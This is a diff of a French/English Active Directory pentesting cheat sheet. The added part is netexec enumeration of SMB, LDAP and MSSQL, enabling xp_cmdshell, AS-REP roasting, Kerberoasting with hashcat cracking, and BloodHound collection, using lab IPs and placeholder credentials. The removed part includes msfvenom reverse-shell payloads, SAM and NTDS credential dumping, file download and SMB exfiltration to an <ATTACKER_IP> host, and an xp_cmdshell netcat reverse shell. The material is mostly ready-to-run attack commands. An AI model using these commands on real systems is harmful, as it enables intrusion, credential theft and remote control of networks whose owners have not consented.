@@ -6,7 +6,9 @@ Ce document regroupe tout ce que j’ai appris au travers des box et des cours d
 
 ***
 
-## 🔎**Recon**
+## **🛡️ Active Directory Cheat Sheet**
+
+### 🔎**Recon Scans**
 
 <details>
 
@@ -380,199 +382,134 @@ main
 
 </details>
 
-## **🛡️ Active Directory Cheat Sheet**
+## 📌 Reconnaissance & Énumération
 
-### 📌 Reconnaissance & Énumération
+### 🔍 SMB Enumeration
 
-<details>
+#### **Manual Commands (netexec)**
 
-<summary>🔍LDAP <strong>Enumeration</strong></summary>
+```bash
+# Enumerate SMB shares, users, sessions, and more (including anonymous auth)
+netexec smb 10.10.10.5 -u '' -p '' --shares --sessions --users --groups --rid-brute --pass-pol --ntds --kerberos --gpo
 
-*   **Énumération LDAP anonyme**
+# List accessible shares
+netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --shares | tee shares.txt
 
-    ```bash
-    ldapsearch -v -x -b "DC=<DOMAIN>,DC=com" -H "ldap://<IP>" "(objectclass=*)"
-    ```
-*   **Énumération LDAP auth (LAPS Password)**
+# Check for writable shares
+netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --spider-share '.*' --check-write | tee writable_shares.txt
+```
 
-    ```bash
-    ldapsearch -x -H "ldap://<IP>" -D "<DOMAIN>\<USER>" -w "<PASSWORD>" -b "DC=<DOMAIN>,DC=com" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
-    ```
-*   **Énumération with Windapsearch**
+### 🔍 LDAP Enumeration
 
-    ```bash
-    ./windapsearch.py --dc-ip <IP> -u "" -U
-    ```
-*   **Extraction of users and descriptions via NetExec**
+#### **Manual Commands (netexec)**
 
-    ```bash
-    #users
-    nxc ldap $ip -u $user -p $password --users
-    #desc
-    nxc ldap "<DC>" -d "<DOMAIN>" -u "<USER>" -p "<PASSWORD>" -M get-desc
-    ```
-*   **Testing if an account exists without kerberos protocol**
+```bash
+# Enumerate LDAP users, groups, and policies (including anonymous if allowed)
+netexec ldap 10.10.10.5 -u '' -p '' --users --groups --password-policy | tee ldap_enum_anon.txt
+netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --users --groups --password-policy | tee ldap_enum.txt
 
-    ```bash
-    nxc ldap 192.168.1.0/24 -u users.txt -p '' -k
-    #mode 18200 hashcat
-    ```
-*   **Asreproasting**
+# Extract all users
+netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --users --json | jq -r '.hosts[].users[] | .username' | sort -u | tee users.txt
 
-    ```bash
-    nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
-    ```
-*   **Kerberoasting**
+# Enumerate domain trusts
+netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --trusts | tee domain_trusts.txt
+```
 
-    ```bash
-    nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
-    #mode 13100 hashcat
-    ```
-*   **Bloodhound collector**
+### 🔍 MSSQL Enumeration
 
-    ```bash
-    nxc ldap <ip> -u user -p pass --bloodhound --collection All
-    ```
+#### **Manual Commands (netexec)**
 
-Rest later
+```bash
+# Check MSSQL login (including null session)
+netexec mssql 10.10.10.5 -u '' -p '' --check-login
+netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --check-login
 
-</details>
+# List databases
+netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --query "SELECT name FROM sys.databases" | tee mssql_databases.txt
 
-<details>
+# Enable xp_cmdshell
+netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --enable-xp-cmdshell
 
-<summary>📂 SMB Enumeration</summary>
+# Execute command via xp_cmdshell
+netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --xp-cmd "whoami /all" | tee xp_cmdshell_output.txt
+```
 
-*   **List SMB Shares and users**
+### 🔍 RDP & WinRM Enumeration
 
-    ```bash
-    crackmapexec smb <IP> --shares -u <USER> -p <PASSWORD> --users
-    # command to get clean users.txt -> awk '{print $5}' > users.txt
-    ```
-*   **Brute force RID for user enumeration**
+#### **Manual Commands (netexec)**
 
-    ```bash
-    nxc smb <IP> -u '' -p '' --rid-brut
-    ```
-*   **List SMB shares anonymous**
+```bash
+# Enumerate RDP access
+netexec winrm 10.10.10.5 -u 'contoso\bob' -p 'Password123' --local-groups --users | tee rdp_users.txt
 
-    ```bash
-    smbclient -L //<IP> -N
-    ```
-*   **Dumping all files in the share**
+# Check if WinRM is enabled
+netexec winrm 10.10.10.5 -u 'contoso\bob' -p 'Password123' --exec whoami
+```
 
-    ```bash
-    nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
-    ```
-*   **Dump SAM with admin privileges (--local-auth possible)**
+### 🔍 SNMP Enumeration
 
-    ```bash
-    nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
-    ```
-*   **Dump NTDS.dit with DomainAdmin or Local Admin**
+#### **Manual Commands**
 
-    ```bash
-    nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
-    ```
+```bash
+# Enumerate SNMP with public community string
+snmpwalk -v2c -c public 10.10.10.5
 
-There are plenty of Credentials discovery commands, no need to put everything, commands here: [https://www.netexec.wiki/smb-protocol/obtaining-credentials](https://www.netexec.wiki/smb-protocol/obtaining-credentials)
+# Check running processes
+snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.25.4.2.1.2
 
-</details>
+# Enumerate open TCP ports
+snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.6.13.1.3
+```
 
-####
+### 🔍 BloodHound Collection
 
-#### 🎯 **Droits Windows (Privilege Escalation)**
+#### **Manual Commands (BloodHound)**
 
-* **SeBackupPrivilege** → Lire des fichiers normalement inaccessibles
-* **SeRestorePrivilege** → Écraser des fichiers protégés
-* **SeImpersonatePrivilege** → Exploitable avec JuicyPotato pour devenir SYSTEM
-* **SeLoadDriverPrivilege** → Charger des drivers malveillants
+```bash
+# Collect BloodHound data
+bloodhound-python -c All -u 'bob' -p 'Password123' -d 'contoso.local' -dc 10.10.10.5 --zip --dns-tcp --disable-pooling -o bloodhound/
+```
 
-***
+### 🔍 Low Hanging Fruits Checks
 
-### 💥 Cracking des Hashes
+#### **Manual Commands (netexec)**
 
-*   **NTLM**
+```bash
+# Check password policy
+netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --password-policy | tee password_policy.txt
 
-    ```bash
-    hashcat -m 1000 -a 3 hash.txt
-    ```
-*   **NetNTLMv1**
+# Identify AS-REP roastable users
+netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --asreproast | tee asrep_roast.txt
+# Crack hashes with hashcat: hashcat -m 18200 asrep_roast.txt rockyou.txt
 
-    ```bash
-    hashcat -m 5500 -a 3 hash.txt
-    ```
-*   **NetNTLMv2**
+# Check for unconstrained delegation
+netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --unconstrained | tee unconstrained_deleg.txt
 
-    ```bash
-    john --format=netntlmv2 hash.txt
-    ```
-*   **SPN Hash (Kerberoasting)**
+# Check if the user is an admin
+netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --admin-check | tee admin_access.txt
+```
 
-    ```bash
-    hashcat -m 13100 -a 0 spn.txt rockyou.txt
-    ```
+### 🔍 Kerberos Enumeration
 
-***
+#### **Manual Commands (netexec)**
 
-### 🚀 Payloads & Reverse Shells
+```bash
+# Enumerate Kerberos tickets (TGT/TGS)
+netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --kerberos | tee kerberos_tickets.txt
 
-*   **Windows Meterpreter**
+# Enumerate users that don’t require pre-authentication (Kerberoasting)
+netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --kerberoast | tee kerberoast.txt
+# Crack hashes with hashcat: hashcat -m 13100 kerberoast.txt rockyou.txt
+```
 
-    ```bash
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
-    ```
-*   **Windows Shell Staged**
+### 🔍 DNS Enumeration
 
-    ```bash
-    msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
-    ```
-*   **PowerShell Reverse Shell**
+#### **Manual Commands**
 
-    ```bash
-    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=<PORT> -f psh-cmd
-    ```
+```bash
+# Test DNS zone transfer
+nslookup -type=AXFR contoso.local 10.10.10.5 | tee dns_zone_transfer.txt
 
-***
-
-### 🔄 Transfert de Fichiers
-
-*   **Serveur HTTP Python**
-
-    ```bash
-    python3 -m http.server 80
-    ```
-*   **Télécharger un fichier via PowerShell**
-
-    ```powershell
-    powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/file.exe' -OutFile 'C:\Users\Public\file.exe'"
-    ```
-*   **Exfiltration via SMB**
-
-    ```bash
-    smbclient //<ATTACKER_IP>/SHARE -U "USER" -c "put file.exe"
-    ```
-
-***
-
-### 🏴‍☠️ Post-Exploitation
-
-*   **Changement du mot de passe via RPC**
-
-    ```bash
-    setuserinfo <USER> 23 'NewPassword123!'
-    ```
-*   **Utilisation d’un ticket Kerberos pour MSSQL**
-
-    ```bash
-    export KRB5CCNAME=$PWD/Administrator.ccache
-    ```
-*   **Téléchargement de Netcat via MSSQL**
-
-    ```bash
-    xp_cmdshell "curl http://<ATTACKER_IP>/nc.exe -o c:\temp\nc.exe"
-    ```
-*   **Reverse Shell via MSSQL**
-
-    ```bash
-    xp_cmdshell "c:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"
-    ```
+# Resolve domain name
+nslookup contoso.local 10.10.10.5
+```
